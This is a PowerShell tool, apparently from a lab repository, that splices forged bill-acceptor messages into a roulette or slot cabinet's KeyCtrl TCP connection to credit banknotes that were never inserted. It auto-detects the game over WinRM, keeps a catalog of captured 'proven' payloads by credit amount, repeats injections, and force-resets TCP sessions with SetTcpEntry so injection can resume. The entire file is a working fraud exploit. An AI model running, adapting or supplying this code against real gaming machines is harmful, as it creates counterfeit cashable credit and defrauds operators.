<#
.SYNOPSIS
    Inject a synthetic bill-accept sequence on KeyCtrl (roulette or Slot).

.DESCRIPTION
    Auto-detects the live game on the cabinet:

      Roulette (ruleta) : CommCtrl :30300, wait for BZ 1 + 999, then splice (billinject)
      Slot (OneHand)    : CommCtrl :30800, force-inject the same 821 burst (no BZ zone poll)

    Proven Slot path (2026-07-29 on .90 while OneHand was up): immediate inject of
      821 18|||821 19|||822 98|||823|||821 17
    → OneHand "Bill 98 … accepted" / cashable credit up.

    Roulette capture path:
      C2S BZ 1 -> S2C 999 -> S2C 821 XX -> C2S BL N / CN N -> S2C 700, 777

    -Credits selects an **active bill denomination** from the lab bill table
    (see -ListDenominations). On Slot the cabinet may scale that note to a different
    token count than roulette credits — the inject still targets the same bill code.

.EXAMPLE
    .\Invoke-BillInjectRouletteRemote.ps1 -ListDenominations

.EXAMPLE
    .\Invoke-BillInjectRouletteRemote.ps1 -Credits 200000 -Send

.EXAMPLE
    .\Invoke-BillInjectRouletteRemote.ps1 -GameKind Slot -Credits 200000 -Send

    If the roulette cabinet shows FUERA DE SERVICIO after a bad inject:
    .\Invoke-ClearRouletteServiceLock.ps1 -ComputerName 10.0.0.90
#>
[CmdletBinding(DefaultParameterSetName = 'DryRun')]
param(
    [string] $ComputerName = '10.0.0.90',
    [int] $BillCode = 0,
    [ValidateSet('minimal', 'credit', 'captured', 'captured2', 'captured5k-alt', 'simple821', 'escrow', 'legacy')]
    [string] $PayloadProfile = 'captured',
    [int] $Credits = 200000,
    [int] $RepeatCount = 1,
    [int] $RunSeconds = 45,
    [int] $RepeatDelaySec = 30,
    # 0 = auto from GameKind (roulette 30300 / slot 30800)
    [int] $ServerPort = 0,
    [ValidateSet('Auto', 'Roulette', 'Slot')]
    [string] $GameKind = 'Auto',
    [string] $TargetProcess = '',
    [string] $WinDivertDir = 'C:\Tools\WinDivert\x64',
    [string] $BillConfigPath = '',
    [switch] $ListDenominations,
    [switch] $ClearLockFirst,
    [Parameter(ParameterSetName = 'DryRun')]
    [switch] $DryRun,
    [Parameter(ParameterSetName = 'Send', Mandatory = $true)]
    [switch] $Send
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$script:DallasCodeOffset = 71

function Format-CreditAmount {
    param([int] $Amount)
    return $Amount.ToString('N0', [System.Globalization.CultureInfo]::InvariantCulture)
}

function Resolve-BillConfigPath {
    param([string] $Override)
    if ($Override) {
        if (-not (Test-Path -LiteralPath $Override)) {
            throw "Bill config not found: $Override"
        }
        return (Resolve-Path -LiteralPath $Override).Path
    }
    $local = Join-Path $PSScriptRoot 'dual-monitor-config\setup.plain.stations2.xml'
    if (Test-Path -LiteralPath $local) {
        return (Resolve-Path -LiteralPath $local).Path
    }
    throw "Bill config missing. Pass -BillConfigPath to setup.plain.stations2.xml (or dual-monitor-config copy)."
}

function Get-RouletteBillDenominations {
    param([string] $ConfigPath)
    [xml] $xml = Get-Content -LiteralPath $ConfigPath -Encoding UTF8
    $billNode = $xml.SelectSingleNode('//node[@name="bill"]')
    if (-not $billNode) { throw "No //node[@name='bill'] in $ConfigPath" }

    $rows = @()
    foreach ($slot in $billNode.ChildNodes) {
        if ($slot.NodeType -ne 'Element') { continue }
        $name = $slot.GetAttribute('name')
        if (-not $name -or $name -eq 'serial bill') { continue }
        $activeNode = $slot.SelectSingleNode('./node[@name="active"]')
        if (-not $activeNode -or $activeNode.InnerText.Trim() -ne '1') { continue }
        $creditNode = $slot.SelectSingleNode('./node[@name="credit"]')
        $codeNode = $slot.SelectSingleNode('./node[@name="code"]')
        $nominalNode = $slot.SelectSingleNode('./node[@name="nominal"]')
        $currencyNode = $slot.SelectSingleNode('./node[@name="currency"]')
        $creditText = if ($creditNode) { $creditNode.InnerText.Trim() } else { '' }
        $codeText = if ($codeNode) { $codeNode.InnerText.Trim() } else { '' }
        $nominalText = if ($nominalNode) { $nominalNode.InnerText.Trim() } else { '' }
        $currency = if ($currencyNode) { $currencyNode.InnerText.Trim() } else { 'COP' }
        if (-not $creditText -or -not $codeText) { continue }
        $credit = [int]$creditText
        $configCode = [int]$codeText
        $dallas = $configCode - $script:DallasCodeOffset
        if ($dallas -lt 0) { continue }
        $rows += [pscustomobject]@{
            Slot       = $name
            Nominal    = $nominalText
            Currency   = $currency
            Credits    = $credit
            ConfigCode = $configCode
            Dallas821  = $dallas
        }
    }
    return @($rows | Sort-Object Credits)
}

function Get-NextValidCredits {
    param(
        [int] $Amount,
        [object[]] $Denoms
    )
    $sorted = @($Denoms | Sort-Object Credits)
    $higher = @($sorted | Where-Object { $_.Credits -gt $Amount })
    if ($higher.Count -gt 0) { return $higher[0].Credits }
    return $null
}

function Build-BillBurstRom {
    param(
        [int] $ConfigCode,
        [int] $End821 = 0
    )
    if ($End821 -le 0) { $End821 = $ConfigCode - 81 }
    return "821 18|||821 19|||822 $ConfigCode|||823|||821 $End821"
}

function Build-BillSimpleRom {
    param([int] $Dallas821)
    return "821 $Dallas821"
}

# Proven / lab inject payloads keyed by cabinet credit amount.
$script:BillCreditCatalog = @{
    200000 = [pscustomobject]@{
        Profile      = 'captured'
        Rom          = (Build-BillBurstRom -ConfigCode 98)
        BillCodeHint = 27
        InjectProven = $true
        PhysicalNote = '2,000 COP - burst after 999 (822 98, end 821 17 = code-81); simple physical also seen: 821 27 alone'
        ProvenWhen   = '2026-07-27 inject 14:01:43 + physical 12:07/12:33'
    }
    500000 = [pscustomobject]@{
        Profile      = 'captured'
        Rom          = (Build-BillBurstRom -ConfigCode 99)
        BillCodeHint = 28
        InjectProven = $true
        PhysicalNote = '5,000 COP - burst after 999: 821 18|19 + 822 99 + 823 + 821 18 (code-81); alt end 821 28'
        ProvenWhen   = '2026-07-27 inject 12:52:05 RCM c=500000 bill code 99 (ClearLockFirst + captured burst)'
    }
}

function Get-BillCreditPlan {
    param(
        [int] $Amount,
        [object[]] $Denoms,
        [int] $Repeat = 1
    )
    if ($Repeat -lt 1) { throw 'RepeatCount must be >= 1' }
    $match = @($Denoms | Where-Object { $_.Credits -eq $Amount })
    if (-not $match) {
        $valid = @($Denoms | ForEach-Object { Format-CreditAmount $_.Credits }) -join ', '
        $hint = ''
        if ($Amount -eq 400000) {
            $next = Get-NextValidCredits -Amount 200000 -Denoms $Denoms
            if ($next) {
                $hint = " There is no 400,000-credit note. Next valid denomination above 200,000 is $(Format-CreditAmount $next)."
            }
        } elseif ($Amount -gt 0) {
            $next = Get-NextValidCredits -Amount $Amount -Denoms $Denoms
            if ($next) {
                $hint = " Next higher active denomination: $(Format-CreditAmount $next)."
            }
        }
        throw ("Credits $(Format-CreditAmount $Amount) is not an active bill denomination on this cabinet. Valid: $valid.$hint")
    }
    if (-not $script:BillCreditCatalog.ContainsKey($Amount)) {
        $catalogged = @($script:BillCreditCatalog.Keys | Sort-Object | ForEach-Object { Format-CreditAmount $_ }) -join ', '
        throw ("Credits $(Format-CreditAmount $Amount) is configured on the cabinet but has no inject payload in the lab catalog yet. Catalogged inject amounts: $catalogged.")
    }
    $entry = $script:BillCreditCatalog[$Amount]
    return @(1..$Repeat | ForEach-Object {
        [pscustomobject]@{
            Credits = $Amount
            Entry   = $entry
            Denom   = $match[0]
        }
    })
}

function Resolve-CabinetGameKind {
    param(
        [string] $ComputerName,
        [string] $Preferred = 'Auto'
    )
    if ($Preferred -and $Preferred -ne 'Auto') {
        return [pscustomobject]@{
            Kind           = $Preferred
            TargetProcess  = $(if ($Preferred -eq 'Slot') { 'OneHand' } else { 'ruleta' })
            ServerPort     = $(if ($Preferred -eq 'Slot') { 30800 } else { 30300 })
            SpliceModeHint = $(if ($Preferred -eq 'Slot') { 'inject' } else { 'billinject' })
            Detected       = $false
        }
    }

    $lab = Join-Path (Split-Path (Split-Path $PSScriptRoot -Parent) -Parent) 'LabAccess.ps1'
    if (-not (Test-Path -LiteralPath $lab)) { $lab = Join-Path $PSScriptRoot '..\..\LabAccess.ps1' }
    if (Test-Path -LiteralPath $lab) { . $lab }

    $probe = Invoke-LabWinRmCommand -ComputerName $ComputerName -ScriptBlock {
        $oneHand = [bool](Get-Process -Name 'OneHand' -EA SilentlyContinue)
        $ruleta = [bool](Get-Process -Name 'ruleta' -EA SilentlyContinue)
        $port30800 = [bool](Get-NetTCPConnection -RemotePort 30800 -State Established -EA SilentlyContinue |
            Where-Object {
                try { (Get-Process -Id $_.OwningProcess -EA Stop).ProcessName -ieq 'OneHand' } catch { $false }
            })
        $port30300 = [bool](Get-NetTCPConnection -RemotePort 30300 -State Established -EA SilentlyContinue |
            Where-Object {
                try { (Get-Process -Id $_.OwningProcess -EA Stop).ProcessName -ieq 'ruleta' } catch { $false }
            })
        [pscustomobject]@{
            OneHand   = $oneHand
            Ruleta    = $ruleta
            Port30800 = $port30800
            Port30300 = $port30300
        }
    }

    if ($probe.OneHand -or $probe.Port30800) {
        return [pscustomobject]@{
            Kind           = 'Slot'
            TargetProcess  = 'OneHand'
            ServerPort     = 30800
            SpliceModeHint = 'inject'
            Detected       = $true
            Probe          = $probe
        }
    }
    if ($probe.Ruleta -or $probe.Port30300) {
        return [pscustomobject]@{
            Kind           = 'Roulette'
            TargetProcess  = 'ruleta'
            ServerPort     = 30300
            SpliceModeHint = 'billinject'
            Detected       = $true
            Probe          = $probe
        }
    }

    # Fallback: historical roulette defaults when nothing is running.
    return [pscustomobject]@{
        Kind           = 'Roulette'
        TargetProcess  = 'ruleta'
        ServerPort     = 30300
        SpliceModeHint = 'billinject'
        Detected       = $false
        Probe          = $probe
    }
}

function Get-BillInjectRom {
    param(
        [int] $Code,
        [string] $Profile,
        [string] $RomOverride,
        [int] $ConfigCode = 0
    )
    if ($RomOverride) { return $RomOverride }
    switch ($Profile) {
        'minimal'   { return (Build-BillSimpleRom -Dallas821 $Code) }
        'simple821' { return (Build-BillSimpleRom -Dallas821 $Code) }
        'escrow'    { return "821 $Code|||807|||803|||701|||666" }
        'legacy'    { return "821 $Code|||807|||803|||701|||666" }
        'captured'  {
            if ($ConfigCode -gt 0) { return (Build-BillBurstRom -ConfigCode $ConfigCode) }
            return '821 18|||821 19|||822 98|||823|||821 17'
        }
        'captured2' {
            if ($ConfigCode -gt 0) {
                $burst = Build-BillBurstRom -ConfigCode $ConfigCode
                $parts = $burst -split '\|\|\|'
                return ($parts[0..2] -join '|||') + '||PHASE||' + ($parts[3..4] -join '|||')
            }
            return '821 18|||821 19|||822 98||PHASE||823|||821 17'
        }
        'captured5k-alt' {
            return (Build-BillBurstRom -ConfigCode 99 -End821 28)
        }
        default     { return "821 $Code||PHASE||700|||777" }
    }
}

$configPath = Resolve-BillConfigPath -Override $BillConfigPath
$denoms = Get-RouletteBillDenominations -ConfigPath $configPath

if ($ListDenominations) {
    Write-Host ''
    Write-Host '=== Active bill denominations (.90 lab config) ===' -ForegroundColor Cyan
    Write-Host (" Source: {0}" -f $configPath)
    Write-Host (" Dallas mapping: 821 (config_code - {0})" -f $script:DallasCodeOffset)
    Write-Host ''
    $denoms | Format-Table -AutoSize Slot, Nominal, Currency, Credits, ConfigCode, Dallas821
    Write-Host 'Inject catalog (payloads we can splice):' -ForegroundColor DarkCyan
    foreach ($key in ($script:BillCreditCatalog.Keys | Sort-Object)) {
        $entry = $script:BillCreditCatalog[$key]
        Write-Host ("  {0,12}  821 {1,2}  profile={2,-9} proven={3}" -f `
            (Format-CreditAmount $key), $entry.BillCodeHint, $entry.Profile, $entry.InjectProven)
    }
    Write-Host ''
    return
}

$creditPlan = @(Get-BillCreditPlan -Amount $Credits -Denoms $denoms -Repeat $RepeatCount)
if (-not $creditPlan -or $creditPlan.Count -lt 1) {
    throw "Internal error: no inject plan for Credits $(Format-CreditAmount $Credits)."
}
$planItem = $creditPlan[0]
$creditEntry = $planItem.Entry
$denom = $planItem.Denom
$injectCount = $creditPlan.Count
$unitCredits = [int]$planItem.Credits
$effectiveBillCode = if ($BillCode -gt 0) { $BillCode } else { [int]$creditEntry.BillCodeHint }

if ($PayloadProfile -ne $creditEntry.Profile) {
    Write-Host ("Note: -Credits {0} selects profile '{1}' (overrides -PayloadProfile '{2}')" -f `
        $Credits, $creditEntry.Profile, $PayloadProfile) -ForegroundColor DarkYellow
    $PayloadProfile = $creditEntry.Profile
}
if ($BillCode -gt 0 -and $BillCode -ne $creditEntry.BillCodeHint) {
    Write-Host ("Note: catalog Dallas code for {0} credits is 821 {1} (you passed -BillCode {2})" -f `
        (Format-CreditAmount $Credits), $creditEntry.BillCodeHint, $BillCode) -ForegroundColor DarkYellow
}

$rom = Get-BillInjectRom -Code $effectiveBillCode -Profile $PayloadProfile `
    -RomOverride $creditEntry.Rom -ConfigCode ([int]$denom.ConfigCode)
$target = Join-Path $PSScriptRoot 'Invoke-DallasSpliceRouletteRemote.ps1'
if (-not (Test-Path -LiteralPath $target)) {
    throw "Missing Dallas orchestrator: $target"
}

$game = Resolve-CabinetGameKind -ComputerName $ComputerName -Preferred $GameKind
if ($TargetProcess) { $game.TargetProcess = $TargetProcess }
$effectivePort = if ($ServerPort -gt 0) { $ServerPort } else { [int]$game.ServerPort }
$spliceMode = if ($game.Kind -eq 'Slot') {
    # Slot KeyCtrl (:30800) has no BZ/999 bill-zone poll — force-inject the burst.
    'inject'
} elseif ($PayloadProfile -in @('credit', 'captured', 'captured2', 'captured5k-alt', 'simple821', 'minimal')) {
    'billinject'
} else {
    'inject'
}
# Slot KeyCtrl is often quiet / reattaching after a prior inject (KEYBOARD detached).
# Give it enough wall time to emit an S2C template before the orchestrator gives up.
$effectiveRunSeconds = if ($game.Kind -eq 'Slot' -and -not $PSBoundParameters.ContainsKey('RunSeconds')) {
    25
} else {
    $RunSeconds
}

Write-Host ''
Write-Host ("=== Bill inject (KeyCtrl :{0} / {1}) ===" -f $effectivePort, $game.Kind) -ForegroundColor Cyan
Write-Host (" Cabinet   : {0}" -f $ComputerName)
Write-Host (" Game      : {0} -> {1} (detect={2})" -f $game.Kind, $game.TargetProcess, $game.Detected)
Write-Host (" Note      : {0} {1} -> bill code {2} (catalog {3} credits)" -f `
    $denom.Nominal, $denom.Currency, $denom.ConfigCode, (Format-CreditAmount $unitCredits))
Write-Host (" Credits   : {0} x {1} inject(s) (proven: {2})" -f `
    (Format-CreditAmount $Credits), $injectCount, $creditEntry.InjectProven)
if ($injectCount -gt 1) {
    Write-Host (" Repeats   : {0} pass(es), {1}s pause between" -f $injectCount, $RepeatDelaySec)
}
Write-Host (" Dallas    : 821 {0} (config code {1})" -f $effectiveBillCode, $denom.ConfigCode)
Write-Host (" Profile   : {0}" -f $PayloadProfile)
Write-Host (" Physical  : {0}" -f $creditEntry.PhysicalNote)
if ($game.Kind -eq 'Slot') {
    Write-Host ' Slot note : force-inject on :30800 (no BZ 1 / 999 wait); token scale may differ from roulette credits.' -ForegroundColor DarkCyan
}
if (-not $creditEntry.InjectProven) {
    Write-Host ' WARNING   : inject not yet proven for this denomination — capture a physical note first.' -ForegroundColor Yellow
}
if ($spliceMode -eq 'billinject' -and $PayloadProfile -eq 'captured2') {
    Write-Host ' Phase1    : 821 18 + 821 19 + 822 98 (after BZ1 + 999)'
    Write-Host ' Phase2    : 823 + 821 17 (after BL 10 ack)'
} elseif ($spliceMode -eq 'billinject' -and $PayloadProfile -eq 'captured') {
    Write-Host (" Burst     : {0} (after BZ1 + 999, single phase + drain)" -f ($rom -replace '\|\|\|', ' | '))
} elseif ($spliceMode -eq 'inject') {
    Write-Host (" Burst     : {0} (immediate inject + drain)" -f ($rom -replace '\|\|\|', ' | '))
} elseif ($PayloadProfile -eq 'credit') {
    Write-Host (" Phase1    : 821 {0} (after BZ1 + 999)" -f $effectiveBillCode)
    Write-Host ' Phase2    : 700 + 777 (after BL 1 / CN 1)'
}
Write-Host (" Payload   : {0}" -f ($rom -replace '\|\|\|', ' | '))
Write-Host (" Mode      : {0}" -f $(if ($Send) { "SEND ($spliceMode)" } else { 'DRY-RUN' }))
Write-Host ''
Write-Host 'Active denominations (lab bill table):' -ForegroundColor DarkCyan
foreach ($row in $denoms) {
    $inj = $script:BillCreditCatalog.ContainsKey([int]$row.Credits)
    Write-Host ("  {0,12}  {1,6} {2,-3}  code={3,3}  821 {4,2}{5}" -f `
        (Format-CreditAmount $row.Credits), $row.Nominal, $row.Currency, $row.ConfigCode, $row.Dallas821, `
        $(if ($inj) { '  [inject catalog]' } else { '' }))
}
Write-Host ''

if (-not $Send) {
    Write-Host 'Dry-run only. Re-run with -Send to inject on the cabinet.' -ForegroundColor Yellow
    return [pscustomobject]@{
        ComputerName   = $ComputerName
        GameKind       = $game.Kind
        TargetProcess  = $game.TargetProcess
        ServerPort     = $effectivePort
        SpliceMode     = $spliceMode
        Credits        = $Credits
        UnitCredits    = $unitCredits
        InjectCount    = $injectCount
        BillCode       = $effectiveBillCode
        ConfigCode     = [int]$denom.ConfigCode
        Profile        = $PayloadProfile
        Payload        = $rom
        InjectProven   = [bool]$creditEntry.InjectProven
        RepeatDelaySec = $RepeatDelaySec
        Sent           = $false
    }
}

if ($ClearLockFirst -and $game.Kind -eq 'Roulette') {
    $repoRoot = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent
    $clearScript = Join-Path $repoRoot 'Invoke-ClearRouletteServiceLock.ps1'
    if (-not (Test-Path -LiteralPath $clearScript)) {
        $clearScript = Join-Path $PSScriptRoot 'Clear-RouletteServiceLock.ps1'
    }
    if (Test-Path -LiteralPath $clearScript) {
        Write-Host ''
        Write-Host '=== Clearing FUERA DE SERVICIO / keyboard lock first ===' -ForegroundColor Yellow
        & $clearScript -ComputerName $ComputerName
    } else {
        Write-Host 'WARNING: Clear lock script not found — cabinet may still be FUERA DE SERVICIO.' -ForegroundColor Yellow
    }
} elseif ($ClearLockFirst -and $game.Kind -eq 'Slot') {
    Write-Host 'Note: -ClearLockFirst is roulette-only; skipped on Slot.' -ForegroundColor DarkYellow
}

function Get-LabAccessPath {
    $lab = Join-Path (Split-Path (Split-Path $PSScriptRoot -Parent) -Parent) 'LabAccess.ps1'
    if (-not (Test-Path -LiteralPath $lab)) { $lab = Join-Path $PSScriptRoot '..\..\LabAccess.ps1' }
    return $lab
}

function Get-SlotKeyCtrlHealth {
    <#
    .SYNOPSIS
      TCP Established alone is not enough — after a bill inject the link often stays
      ESTABLISHED while KeyCtrl logs "Keyboard detached" and carries zero traffic.
    #>
    $lab = Get-LabAccessPath
    if (Test-Path -LiteralPath $lab) { . $lab }
    Invoke-LabWinRmCommand -ComputerName $ComputerName -ScriptBlock {
        param($Port)
        $tcpOk = [bool]@(Get-NetTCPConnection -RemotePort $Port -State Established -EA SilentlyContinue | Where-Object {
            try { (Get-Process -Id $_.OwningProcess -EA Stop).ProcessName -ieq 'OneHand' } catch { $false }
        }).Count

        $log = Join-Path 'C:\Goldclub\var\log\OneHand' ((Get-Date).ToString('yyyy-MM-dd') + '.log')
        $attached = $false
        $detached = $false
        $last = ''
        if (Test-Path -LiteralPath $log) {
            $hits = @(Select-String -LiteralPath $log -Pattern 'Keyboard attached|Keyboard detached' -EA SilentlyContinue |
                Select-Object -Last 6)
            if ($hits.Count -gt 0) {
                $last = $hits[-1].Line
                if ($last -match 'Keyboard attached') { $attached = $true }
                if ($last -match 'Keyboard detached') { $detached = $true }
            }
        }
        [pscustomobject]@{
            TcpOk    = $tcpOk
            Attached = $attached
            Detached = $detached
            LastLine = $last
            Healthy  = [bool]($tcpOk -and $attached -and -not $detached)
        }
    } -ArgumentList $effectivePort
}

function Reset-SlotKeyCtrlSession {
    <#
    .SYNOPSIS
      Delete the zombie OneHand<->CommCtrl:30800 TCP row so OneHand reconnects and
      re-attaches the keyboard (SetTcpEntry delete-TCB).
    #>
    Write-Host ' Resetting zombie KeyCtrl TCP session (force OneHand reconnect)...' -ForegroundColor Yellow
    $lab = Get-LabAccessPath
    if (Test-Path -LiteralPath $lab) { . $lab }
    Invoke-LabWinRmCommand -ComputerName $ComputerName -ScriptBlock {
        param($Port)
        $code = @'
using System;
using System.Runtime.InteropServices;
public static class TcpKick {
  [StructLayout(LayoutKind.Sequential)]
  public struct MIB_TCPROW {
    public uint State;
    public uint LocalAddr;
    public uint LocalPort;
    public uint RemoteAddr;
    public uint RemotePort;
  }
  [DllImport("iphlpapi.dll", SetLastError=true)]
  public static extern uint SetTcpEntry(ref MIB_TCPROW row);
  public static uint Htoms(uint v) {
    // network order for port fields expected by SetTcpEntry
    return ((v & 0xFF) << 8) | ((v >> 8) & 0xFF);
  }
}
'@
        Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
        $killed = 0
        Get-NetTCPConnection -RemotePort $Port -State Established -EA SilentlyContinue | Where-Object {
            try { (Get-Process -Id $_.OwningProcess -EA Stop).ProcessName -ieq 'OneHand' } catch { $false }
        } | ForEach-Object {
            $row = New-Object TcpKick+MIB_TCPROW
            $row.State = 12  # MIB_TCP_STATE_DELETE_TCB
            $row.LocalAddr = [BitConverter]::ToUInt32([System.Net.IPAddress]::Parse($_.LocalAddress).GetAddressBytes(), 0)
            $row.RemoteAddr = [BitConverter]::ToUInt32([System.Net.IPAddress]::Parse($_.RemoteAddress).GetAddressBytes(), 0)
            $row.LocalPort = [TcpKick]::Htoms([uint32]$_.LocalPort)
            $row.RemotePort = [TcpKick]::Htoms([uint32]$_.RemotePort)
            $rc = [TcpKick]::SetTcpEntry([ref]$row)
            if ($rc -eq 0) { $killed++ } else { Write-Output ("SetTcpEntry rc={0} local={1}" -f $rc, $_.LocalPort) }
        }
        "killed=$killed"
    } -ArgumentList $effectivePort
}

function Wait-SlotKeyCtrlReady {
    param(
        [int] $TimeoutSec = 45,
        [switch] $AllowKick
    )
    if ($game.Kind -ne 'Slot') { return $true }
    Write-Host (" Waiting up to {0}s for Slot KeyCtrl ATTACHED on :{1}..." -f $TimeoutSec, $effectivePort) -ForegroundColor DarkGray
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    $kicked = $false
    while ((Get-Date) -lt $deadline) {
        $h = Get-SlotKeyCtrlHealth
        if ($h.Healthy) {
            Write-Host ' KeyCtrl healthy (TCP + Keyboard attached).' -ForegroundColor Green
            return $true
        }
        if ($AllowKick -and -not $kicked -and $h.TcpOk -and $h.Detached) {
            Write-Host (" KeyCtrl DETACHED (last: {0})" -f ($(if ($h.LastLine) { $h.LastLine.Substring([Math]::Max(0, $h.LastLine.Length - 80)) } else { '?' }))) -ForegroundColor Yellow
            Reset-SlotKeyCtrlSession | Out-Host
            $kicked = $true
            Start-Sleep -Seconds 3
            continue
        }
        Start-Sleep -Seconds 1
    }
    $h = Get-SlotKeyCtrlHealth
    Write-Host (" WARNING: KeyCtrl not healthy (tcp={0} attached={1} detached={2})." -f $h.TcpOk, $h.Attached, $h.Detached) -ForegroundColor Yellow
    return $false
}

function Invoke-OneBillSplice {
    param([int] $Attempt)
    if ($Attempt -gt 1) {
        Write-Host (" Retry {0}: recover KeyCtrl then inject..." -f $Attempt) -ForegroundColor DarkYellow
        $null = Wait-SlotKeyCtrlReady -TimeoutSec 40 -AllowKick
    }
    $spliceArgs = @{
        ComputerName   = $ComputerName
        Mode           = $spliceMode
        Action         = 'insert'
        Rom            = $rom
        RunSeconds     = $effectiveRunSeconds
        InjectAfterMs  = $(if ($spliceMode -eq 'inject') { 300 } else { 0 })
        HitTimeoutSec  = $(if ($spliceMode -eq 'inject') { $effectiveRunSeconds } else { 4 })
        ServerPort     = $effectivePort
        TargetProcess  = $game.TargetProcess
        WinDivertDir   = $WinDivertDir
        SkipGate       = $true
    }
    if ($game.Kind -eq 'Slot') {
        # Wait for drain in-process so the KeyCtrl TCP seq/ack returns to sync.
        # Background drain after Fast return is what leaves "Keyboard detached" zombies.
        # Do NOT wait for KEY=admin — bill burst is not a Dallas admin insert.
        $spliceArgs.WaitForDrain = $true
        $spliceArgs.WaitForDallas = $false
        $spliceArgs.DrainReserveSec = 8
    } else {
        $spliceArgs.Fast = $true
    }
    & $target @spliceArgs
}

$null = Wait-SlotKeyCtrlReady -TimeoutSec 45 -AllowKick

for ($i = 0; $i -lt $injectCount; $i++) {
    if ($injectCount -gt 1) {
        Write-Host ''
        Write-Host ("=== Bill inject pass {0}/{1} (bill code {2}) ===" -f ($i + 1), $injectCount, $denom.ConfigCode) -ForegroundColor Cyan
    }
    $maxAttempts = if ($game.Kind -eq 'Slot') { 3 } else { 1 }
    $ok = $false
    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
        $flagUnc = "\\$ComputerName\c`$\Windows\Temp\wd_roulette\inject.flag"
        $liveUnc = "\\$ComputerName\c`$\Windows\Temp\wd_roulette\splice_live.log"
        Remove-Item -LiteralPath $flagUnc -Force -EA SilentlyContinue

        Invoke-OneBillSplice -Attempt $attempt

        $injected = $false
        if (Test-Path -LiteralPath $flagUnc) { $injected = $true }
        elseif (Test-Path -LiteralPath $liveUnc) {
            $tail = Get-Content -LiteralPath $liveUnc -Raw -EA SilentlyContinue
            if ($tail -match 'INJECTED ROM|BILL_INJECT') { $injected = $true }
        }
        if ($injected) {
            $ok = $true
            Write-Host (" Inject OK (attempt {0}/{1})" -f $attempt, $maxAttempts) -ForegroundColor Green
            if ($game.Kind -eq 'Slot') {
                Write-Host ' Waiting for KeyCtrl to re-attach after inject...' -ForegroundColor DarkGray
                $null = Wait-SlotKeyCtrlReady -TimeoutSec 50 -AllowKick
            }
            break
        }
        Write-Host (" Inject missed (attempt {0}/{1}) - KeyCtrl idle or detached." -f `
            $attempt, $maxAttempts) -ForegroundColor Yellow
        if ($game.Kind -eq 'Slot') {
            $null = Wait-SlotKeyCtrlReady -TimeoutSec 35 -AllowKick
        }
    }
    if (-not $ok) {
        Write-Host ' FAILED: bill burst was not spliced. KeyCtrl stayed detached/idle.' -ForegroundColor Red
        exit 2
    }
    if ($i -lt ($injectCount - 1)) {
        Write-Host ("Waiting {0}s before next inject..." -f $RepeatDelaySec) -ForegroundColor DarkYellow
        Start-Sleep -Seconds $RepeatDelaySec
    }
}
